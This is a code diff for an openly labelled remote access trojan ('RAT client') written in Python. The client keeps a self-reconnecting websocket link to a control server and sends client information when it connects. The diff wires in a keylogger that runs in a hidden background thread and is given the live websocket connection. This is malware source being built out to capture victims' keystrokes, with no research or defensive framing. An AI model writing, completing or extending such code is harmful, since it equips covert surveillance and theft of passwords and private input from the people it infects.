@@ -1,10 +1,12 @@
 import json
 import uuid
 import time
-import argparse
 import threading
 import websocket
 
+import util
+import keylogger
+import classes
 
 SERVER_URL = "ws://localhost:8080/ws/seeker"
 RECONNECT_DELAY = 5
@@ -12,6 +14,7 @@ RECONNECT_DELAY = 5
 seconds_disconnected = 0
 client_uuid = None
 should_reconnect = True
+ws_holder = classes.WSHolder()
 
 def on_message(ws, message):
     global should_reconnect
@@ -38,7 +41,8 @@ def on_close(ws, close_status_code, close_msg):
 
 
 def on_open(ws):
-    global seconds_disconnected
+    global seconds_disconnected, ws_holder
+    ws_holder.ws = ws
     seconds_disconnected = 0
     print("[WebSocket] Connected.")
 
@@ -52,9 +56,8 @@ def on_open(ws):
 
     ws.send(json.dumps(rat_info))
 
-
 def run_websocket():
-    global seconds_disconnected, should_reconnect
+    global seconds_disconnected, should_reconnect, ws_holder
 
     while should_reconnect:
         ws = websocket.WebSocketApp(
@@ -75,19 +78,15 @@ def run_websocket():
         print(f"[Reconnect] Lost connection. Retrying in {RECONNECT_DELAY}s (disconnected for {seconds_disconnected}s)...")
         time.sleep(RECONNECT_DELAY)
 
-
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="RAT client")
-    parser.add_argument("--uuid", type=str, help="Optional UUID for this RAT client")
-    return parser.parse_args()
-
-
 def main():
     global client_uuid
 
-    args = parse_arguments()
+    args = util.parse_arguments()
     client_uuid = args.uuid or str(uuid.uuid4())
     print(f"[Info] Using UUID: {client_uuid}")
+
+    keylogger_thread = threading.Thread(target=keylogger.start, args=(ws_holder,), daemon=True)
+    keylogger_thread.start()
 
     thread = threading.Thread(target=run_websocket, daemon=True)
     thread.start()
